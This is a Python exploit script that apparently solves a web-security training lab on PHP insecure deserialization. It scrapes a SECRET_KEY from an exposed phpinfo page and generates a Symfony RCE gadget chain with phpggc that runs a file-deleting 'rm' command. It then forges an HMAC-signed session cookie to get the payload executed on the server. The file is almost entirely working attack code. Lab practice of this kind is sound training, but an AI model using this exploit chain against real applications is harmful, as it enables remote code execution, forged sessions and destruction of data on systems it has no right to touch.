import requests
import re
from urllib.parse import quote_plus
import base64
import subprocess
import hmac
import hashlib
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.secret_ket = None
        self.final_serialized_object_string = None
        self.cookie = None

    def signing_in(self):
        data = {
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def getting_the_secret_key(self):
        response = self.session.get(self.lab_url + 'cgi-bin/phpinfo.php')
        self.secret_ket = re.search(r'<tr><td class="e">\$_SERVER\[\'SECRET_KEY\'\]</td><td class="v">([a-zA-Z0-9]+)</td></tr>', response.text).groups(1)[0]

    def creating_the_malicious_object(self):
        command = '/home/ma4747gh/Desktop/phpggc/phpggc Symfony/RCE4 exec \'rm /home/carlos/morale.txt\''
        serialized_object_string = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout
        self.final_serialized_object_string = quote_plus(base64.b64encode(serialized_object_string))

    @staticmethod
    def sign_with_hmac_sha1(secret_key, data):
        key_bytes = bytes(secret_key, 'utf-8')
        data_bytes = bytes(data, 'utf-8')
        hmac_sha1 = hmac.new(key_bytes, data_bytes, hashlib.sha1)
        signature = hmac_sha1.hexdigest()
        return signature

    def creating_the_session(self):
        sig = self.sign_with_hmac_sha1(self.secret_ket, self.final_serialized_object_string)
        self.cookie = quote_plus('{{"token":"{}","sig_hmac_sha1":"{}"}}'.format(self.final_serialized_object_string, sig))

    def updating_the_session(self):
        self.session.cookies['session'] = self.cookie
        self.session.get(self.lab_url)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.signing_in()
        self.getting_the_secret_key()
        self.creating_the_malicious_object()
        self.creating_the_session()
        self.updating_the_session()
        self.checking_solution()


solver = Solver(sys.argv[1])
solver.start()
